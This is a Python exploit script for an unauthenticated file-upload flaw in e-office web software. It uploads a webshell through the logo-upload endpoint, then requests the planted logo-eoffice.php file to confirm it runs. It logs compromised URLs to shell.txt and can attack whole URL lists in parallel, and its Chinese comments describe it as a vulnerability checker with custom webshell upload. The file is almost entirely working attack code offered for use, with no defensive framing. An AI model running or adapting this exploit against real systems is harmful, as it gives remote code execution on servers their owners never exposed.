import requests
import config
import optparse
import warnings
import os
from multiprocessing import Pool

warnings.filterwarnings('ignore')

proxies={"http":"http://127.0.0.1:8080"}

def existsfile(filename):
    if os.path.exists(filename):
        return True
    else:
        print("[-] shell文件不存在:{}".format(filename))
        exit()

class Upload():
    def __init__(self):
        self.timeout=3 #请求超时设置
        self.data=config.data
        self.headers=config.header
        self.filename=config.uploadfilename
        self.shell=config.filename
        self.shellpath="/images/logo/logo-eoffice.php"
        self.check="RaidEnMei_Good"

    def upload(self,url):
        upload_url=url.rstrip("/")+"/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
        try:
            rqt=requests.post(url=upload_url,headers=self.headers,data=self.data.format(filename=self.filename,shell=open(self.shell,"r",encoding="utf-8").read()),verify=False,timeout=self.timeout)
            text=rqt.text
            if rqt.status_code==200 and text=="logo-eoffice.php":
                print("[*] Upload Sucess url:{}".format(url))
                shellurl=url.rstrip("/")+self.shellpath
                rqt2=requests.get(url=shellurl,headers=self.headers,verify=False,timeout=self.timeout)
                if self.check in rqt2.text:
                    print("[+] Shell Sucess url:{}".format(shellurl))
                    print("[+] Shell Sucess url:{}".format(shellurl),file=open("shell.txt","a",encoding="utf-8"))
                else:
                    print("[-] Shell Failure url:{} http_code:{}".format(shellurl,rqt2.status_code))
                    print("[-] Shell Failure url:{} http_code:{}".format(shellurl, rqt2.status_code),file=open("shell_failure.txt","a",encoding="utf-8"))
            else:
                print("[-] Upload Failure,url:{} http_code:{}".format(url,rqt.status_code))
                print("[-] Upload Failure,url:{} http_code:{}".format(url, rqt.status_code),file=open("upload_failure.txt","a",encoding="utf-8"))
        except Exception as error:
            pass


if __name__ == '__main__':
    usage="Example:\n" \
          "python upload.py -u <url> #检测是否存在文件上传漏洞\n" \
          "python upload.py -f <file> #批量检测是否存在文件上传漏洞\n" \
          "python upload.py -u <url> -p <webshell_path> -s RaidEnMei #自定义webshell上传，定义检测shell关键字\n" \
          "python upload.py -f <file> -p <webshell_path> -s RaidEnMei #自定义webshell上传，定义检测shell关键字 (批量检测)\n"
    rce=Upload()
    parser=optparse.OptionParser()
    parser.add_option("-u",dest="url",help="要检测的url")
    parser.add_option("-p",dest="path",help="自定义上传文件shell文件路径")
    parser.add_option("-f",dest="file",help="批量检测")
    parser.add_option("-s",dest="str",help="shell上传成功后检测是否成功的关键字")
    option,args=parser.parse_args()
    if option.url:
        if option.path and option.str:
            rce.check = option.str
            if existsfile(option.path):rce.shell=option.path
        rce.upload(url=option.url)

    elif option.file:
        if option.path and option.str:
            if option.str == "None":
                rce.check = ""
            else:
                rce.check = option.str
            if existsfile(option.path):rce.shell=option.path
        if os.path.exists(option.file):
            urllist=open(option.file,"r",encoding="utf-8").read().split("\n")
            rce.urlnumber=len(urllist)
            print("url总数量:{}".format(len(urllist)))
            pool=Pool()
            pool.map(rce.upload,urllist)
        else:
            print("[-] 文件不存在:{}".format(option.file))
    else:
        print(usage+"\n")
        parser.print_help()